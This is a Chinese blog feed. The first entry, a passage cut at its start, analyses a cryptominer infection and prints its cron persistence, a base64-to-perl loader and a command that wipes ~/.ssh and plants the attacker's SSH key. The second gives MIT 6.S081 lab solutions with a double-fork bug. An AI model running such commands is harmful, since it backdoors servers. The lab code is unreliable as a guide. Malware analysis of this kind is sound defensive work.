Sat Mar  <span class="token number">7</span> <span class="token number">16</span>:49:25 <span class="token number">2020</span> -<span class="token operator">></span> main.cvd database is up to <span class="token function">date</span> <span class="token punctuation">(</span>version: <span class="token number">59</span>, sigs: <span class="token number">4564902</span>, f-level: <span class="token number">60</span>, builder: sigmgr<span class="token punctuation">)</span>
Sat Mar  <span class="token number">7</span> <span class="token number">16</span>:49:25 <span class="token number">2020</span> -<span class="token operator">></span> bytecode.cvd database is up to <span class="token function">date</span> <span class="token punctuation">(</span>version: <span class="token number">331</span>, sigs: <span class="token number">94</span>, f-level: <span class="token number">63</span>, builder: anvilleg<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>居然显示病毒库是最新的</p>
<p>可疑进程 /opt/atlassian/confluence/jre//bin/java -Djava.ut</p>
<p>然后看了一下有没有可疑的定时任务</p>
<pre class="line-numbers language-none"><code class="language-none">root@xi102:~# crontab -l
0 0 *&#x2F;3 * * &#x2F;root&#x2F;.bashtemp&#x2F;a&#x2F;upd&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1
@reboot &#x2F;root&#x2F;.bashtemp&#x2F;a&#x2F;upd&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1
5 8 * * 0 &#x2F;root&#x2F;.bashtemp&#x2F;b&#x2F;sync&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1
@reboot &#x2F;root&#x2F;.bashtemp&#x2F;b&#x2F;sync&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1
0 0 *&#x2F;3 * * &#x2F;tmp&#x2F;.X19-unix&#x2F;.rsync&#x2F;c&#x2F;aptitude&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>那个tmp下面有的时候是<code>0 0 */3 * * /tmp/.X21-unix/.rsync/c/aptitude&gt;/dev/null 2&gt;&amp;1</code></p>
<p>这个<code>.X某某-unix</code>应该是想伪装成<code>.X11-unix</code>X11转发的临时文件</p>
<p>root@xi102:~/.bashtemp# ps aux | grep cron root 140526 0.0 0.0 12944 1028 pts/1 S+ 17:16 0:00 grep --color=auto cron</p>
<p>看了一下这个目录下面，有鬼，应该就是它了</p>
<pre class="line-numbers language-none"><code class="language-none">root@xi102:~&#x2F;.bashtemp# ls
a  b  cron.d  dir2.dir<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>谷歌随手一搜这个.bashtemp，全都是被挖矿的被黑的，先干掉再说 http://blog.itpub.net/31559758/viewspace-2667801/ https://www.anquanke.com/post/id/197662 更新，又看到几个的 http://m.lanhusoft.com/Article/745.html https://yulijia.net/cn/操作系统/2020/03/03/Trojan-attack-analysis.html#fn:2 把这个文件夹拉下来，可以看到里面有个run文件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>
<span class="token function">nohup</span> ./stop<span class="token operator">>></span>/dev/null <span class="token operator">&amp;</span>
<span class="token function">sleep</span> <span class="token number">5</span>
<span class="token builtin class-name">echo</span> <span class="token string">"ZXZhbCB1bnBh....这里太长略过..."</span> <span class="token operator">|</span> base64 --decode <span class="token operator">|</span> perl
<span class="token builtin class-name">cd</span> ~ <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> -rf .ssh <span class="token operator">&amp;&amp;</span> <span class="token function">mkdir</span> .ssh <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">echo</span> <span class="token string">"ssh-rsa AAAAB3N...
这里一段密钥太长略过...fckr"</span><span class="token operator">>></span>.ssh/authorized_keys <span class="token operator">&amp;&amp;</span> <span class="token function">chmod</span> -R <span class="token assign-left variable">go</span><span class="token operator">=</span> ~/.ssh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里的rsa密钥和那一串base64编码的perl脚本太长，单独放出来</p>
<p>rsa：</p>
<pre class="line-numbers language-none"><code class="language-none">AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2&#x2F;9p7+vD0EpZ3Tz&#x2F;+0kX34uAx1RV&#x2F;75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw&#x3D;&#x3D; mdrfckr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>perl脚本（base64解码之后）：</p>
<pre class="line-numbers language-none"><code class="language-none">eval unpack u&#x3D;&gt;q&#123;_&quot;FUY(...中间这一段还是太长略过...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>使用perl的unpack把后面那一段解包之后还是有900多行，太长了，放到Github gist上了<a href="#fn3" class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a> (按照挖矿佬的风俗是不是应该放到pastebin上？)</p>
<p>我上面放的那两篇文章里的情况和这个几乎一样。大概就是先运行一个<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnRyZW5kbWljcm8uY29tL3RyZW5kbGFicy1zZWN1cml0eS1pbnRlbGxpZ2VuY2Uvb3V0bGF3LWhhY2tpbmctZ3JvdXBzLWJvdG5ldC1vYnNlcnZlZC1zcHJlYWRpbmctbWluZXItcGVybC1iYXNlZC1iYWNrZG9vci8=">perl的脚本<i class="fa fa-external-link-alt"></i></span>，然后把你的SSH密钥删了，插入它的后门密钥。进程伪装成rsync之类的东西。运行后会在<code>\tmp\</code>下面产生一个<span class="exturl" data-url="aHR0cHM6Ly9ibG9ncy5qdW5pcGVyLm5ldC9lbi11cy90aHJlYXQtcmVzZWFyY2gvZG90YTMtaXMteW91ci1pbnRlcm5ldC1vZi10aGluZ3MtZGV2aWNlLW1vb25saWdodGluZw==">dota3文件<i class="fa fa-external-link-alt"></i></span></p>
<p>看到了一个可疑的欧洲IP：45.9.148.125 和一个可疑的网站：www.minpop.com</p>
<h3 id="后续清理工作">后续清理工作</h3>
<p>干掉定时任务<code>crontab -e</code>,把上面那几条定时任务全删了 删除<code>~/.ssh</code>目录底下可疑的authorized_keys 删除定时任务中的可疑文件夹<code>.bashtemp</code>和<code>.X21-unix</code></p>
<h2 id="注">注</h2>
<section class="footnotes" role="doc-endnotes">
<hr />
<ol>
<li id="fn1" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly9pc2lzdGVyLmNjL3Bvc3RzL0ZhaWwyYmFuLUJhc2lj">使用 Fail2Ban 加固你的 Linux 服务器<i class="fa fa-external-link-alt"></i></span><a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn2" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly9mb3J1bS51YnVudHUub3JnLmNuL3ZpZXd0b3BpYy5waHA/Zj0xMjAmYW1wO3Q9MjU3MzMz">细说linux挂载——mount，及其他……<i class="fa fa-external-link-alt"></i></span><a href="#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn3" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vQXJjaGFlb3JhcHRvci8wN2RjM2RmZTc0MWEyYzMzMmJmYWRkZWU3ZTk1YjVkOA==">完整的perl脚本<i class="fa fa-external-link-alt"></i></span><a href="#fnref3" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>
]]></content>
      <categories>
        <category>102网吧日常</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>MIT 6.S081 Lab1 Util</title>
    <url>/6.s081-lab-util/</url>
    <content><![CDATA[<p>6.S081是原6.828 lab的简单重置版（萌新青春版），以RISC-V和xv6为例讲OS，Lab还挺有意思的。 <span id="more"></span></p>
<p>之前都是学的ARM，之前自己看csapp的时候x86汇编那几章全跳过去了。正好最近刚考完最后一门课，老板留我们7月在学校里打黑工（其实完全没啥事干），可以闲下来做点一直想做但没空的Lab了。</p>
<h2 id="lab1">Lab1</h2>
<p>第一个Lab,都很简单，帮你熟悉一下xv6和系统调用。</p>
<p>直接照着提示做就好了。</p>
<p>测试可以用<code>make grade</code>测试全部成绩。测试单个成绩可以用<code>./grade-lab-util xxx</code> 或者<code>make GRADEFLAGS=xxx grade</code></p>
<p>有的时候需要测试打印</p>
<h3 id="boot-xv6">Boot xv6</h3>
<p>先下载</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone git://g.csail.mit.edu/xv6-labs-2020
<span class="token builtin class-name">cd</span> xv6-labs-2020
<span class="token function">git</span> switch util<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>然后编译运行xv6。</p>
<h3 id="sleepeasy">sleep(easy)</h3>
<blockquote>
<p>Implement the UNIX program <code>sleep</code> for xv6; your <code>sleep</code> should pause for a user-specified number of ticks. A tick is a notion of time defined by the xv6 kernel, namely the time between two interrupts from the timer chip. Your solution should be in the file <code>user/sleep.c</code>.</p>
</blockquote>
<p>这个也没有什么好说的，让你熟悉一下系统调用。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/types.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/stat.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"user/user.h"</span></span>

<span class="token keyword">int</span>
<span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
      <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"usage: sleep &lt;n>\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sleep</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后看一下测试（grade），一次通过，简单。</p>
<p><img src="6.S081-lab-util/image-20210702153759549.png" alt="image-20210702153759549" style="zoom: 67%;" /></p>
<h3 id="pingpongeasy">pingpong(easy)</h3>
<blockquote>
<p>Write a program that uses UNIX system calls to ''ping-pong'' a byte between two processes over a pair of pipes, one for each direction. The parent should send a byte to the child; the child should print "<pid>: received ping", where <pid> is its process ID, write the byte on the pipe to the parent, and exit; the parent should read the byte from the child, print "<pid>: received pong", and exit. Your solution should be in the file <code>user/pingpong.c</code>.</p>
</blockquote>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/types.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/stat.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"user/user.h"</span></span>

<span class="token keyword">int</span>
<span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> parent<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> child<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> p <span class="token operator">=</span> <span class="token function">pipe</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token function">pipe</span><span class="token punctuation">(</span>child<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span><span class="token punctuation">(</span>p <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"error create pipe parent"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">if</span><span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"error create pipe child"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment">//child process, fork = 0</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">close</span><span class="token punctuation">(</span>parent<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//close write of parent</span>
    <span class="token function">close</span><span class="token punctuation">(</span>child<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//close read of child</span>
    <span class="token function">read</span><span class="token punctuation">(</span>parent<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d: received p%sng\n"</span><span class="token punctuation">,</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">write</span><span class="token punctuation">(</span>child<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"o"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">close</span><span class="token punctuation">(</span>child<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//close write of child</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment">//parent process, fork > 0</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">close</span><span class="token punctuation">(</span>parent<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//close read of parent</span>
    <span class="token function">close</span><span class="token punctuation">(</span>child<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//close write of child</span>
    <span class="token function">write</span><span class="token punctuation">(</span>parent<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"i"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">close</span><span class="token punctuation">(</span>parent<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//close write of parent</span>
    <span class="token function">read</span><span class="token punctuation">(</span>child<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d: received p%sng\n"</span><span class="token punctuation">,</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>熟悉一下fork和管道呗。</p>
<p>一开始传的是"ping", "pong"，各占四个byte，又读了一遍题发现这里只让用1个byte，注意到ping和pong只差一个字母，那就传i和o好了。</p>
<p>这个小玩意本身没什么难的，已经对c完全手生的我愣是做了一个多小时。pipe的0是读，1是写，一开始我搞反了，下午上一个水课的时候又困又饿，调了半个小时百思不得其解。这个Lab几个作业里面做的最失败的一个（没想到竟然栽在一个easy上了），写了一点注释整理了好几次思路才pass。</p>
<p><img src="/6.s081-lab-util/1625234931.png" /></p>
<h3 id="primes">primes</h3>
<blockquote>
<p>Write a concurrent version of prime sieve using pipes. This idea is due to Doug McIlroy, inventor of Unix pipes. The picture halfway down <span class="exturl" data-url="aHR0cDovL3N3dGNoLmNvbS9+cnNjL3RocmVhZC8=">this page<i class="fa fa-external-link-alt"></i></span> and the surrounding text explain how to do it. Your solution should be in the file <code>user/primes.c</code>.</p>
</blockquote>
<p>素数筛，这个之前看go语言圣经的经典例子。 扔给你的这篇论文<span class="exturl" data-url="aHR0cHM6Ly9zd3RjaC5jb20vfnJzYy90aHJlYWQv">Bell Labs and CSP Threads<i class="fa fa-external-link-alt"></i></span> 扯了一下CSP模型的，你看这作者Russ Cox，霍，这不是go的.....再一看素数筛、共享内存、CSP模型介绍、 后面还提了一嘴go，引用里一堆Robe Pike等熟悉的名字。写过go的孩子是不是有一股我们在哪里见过的感觉......</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span>
<span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token comment">// char prime[MAXN];</span>
  <span class="token comment">// menset(prime, 1, sizeof(prime));</span>
  <span class="token keyword">int</span> p<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token function">pipe</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">//children process</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"fork error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">sieve</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>  <span class="token comment">//p process</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> MAXN<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token function">write</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>i<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//write numbers into pipe</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">close</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//close wiring of parent</span>
    <span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//wait for all child process to end</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span>
<span class="token function">sieve</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span> p<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> child<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> n<span class="token punctuation">;</span>

  <span class="token function">close</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>n<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//exit </span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">pipe</span><span class="token punctuation">(</span>child<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment">//child is not prime</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">sieve</span><span class="token punctuation">(</span>child<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//start a new child process</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">close</span><span class="token punctuation">(</span>child<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"prime %d\n"</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> prime <span class="token operator">=</span> n<span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>n<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>n<span class="token operator">%</span>prime <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">write</span><span class="token punctuation">(</span>child<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>n<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">close</span><span class="token punctuation">(</span>child<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//close writing of parent</span>
    <span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>一开始觉得这有什么难的，仿照go版本写一个不就完事了。也没看提示，在我本机上明明是好的扔到qemu的xv6上就开始乱了，调了半天。然后又读了一遍看到提示<code>Be careful to close file descriptors that a process doesn't need, because otherwise your program will run xv6 out of resources before the first process reaches 35.</code></p>
<p>然后发现打印出来有时是正确的，有时是乱序的。</p>
<figure>
<img src="/6.s081-lab-util/image-20210703170414708.png" alt="image-20210703170414708" /><figcaption aria-hidden="true">image-20210703170414708</figcaption>
</figure>
<p>最后又搜了一下， <span class="exturl" data-url="aHR0cHM6Ly93d3cuY3MuZGFydG1vdXRoLmVkdS9+ZG91Zy9zaWV2ZS9zaWV2ZS5wZGY=">Coroutine prime number sieve<i class="fa fa-external-link-alt"></i></span>, Douglas McIlroy在这里面给了一个c的例子，用dup来复制文件描述符，然后关闭管道。对照着这个我检查了一下，是少了一个<code>close(p[0]);</code></p>
<p>比go麻烦好多........</p>
<h3 id="find">find</h3>
<blockquote>
<p>Write a simple version of the UNIX find program: find all the files in a directory tree with a specific name. Your solution should be in the file <code>user/find.c</code>.</p>
</blockquote>
<p>这个不难，处理细节有点繁琐，注意递归的时候不要把<code>.</code>和<code>..</code>算进去就好了。可以参考<code>ls.c</code>和<code>grep.c</code>（选做正则匹配）。照抄ls的代码然后写一个简单的DFS或者BFS就可以了（目录是个树，如果不考虑软链接）。</p>
<h3 id="xargs">xargs</h3>
<p>实现xarg命令，就用fork和exec实现就好了。这些碰到问题可以直接参考（抄 袭）一下xv6的源码或者gnu coreutils的实现。代码略长，不贴了。<strong>注意</strong>这里每次调试的时候要<code>make clean</code>清除编译缓存。</p>
<p>贴一个xargs用法的比较好的文章：<span class="exturl" data-url="aHR0cHM6Ly93d3cuanVubWFqaW5sb25nLmNvbS9zaGVsbC94YXJncy8=">Linux xargs命令详解<i class="fa fa-external-link-alt"></i></span> 为数不多的对这个命令的用心介绍。</p>
<h2 id="题外话">题外话</h2>
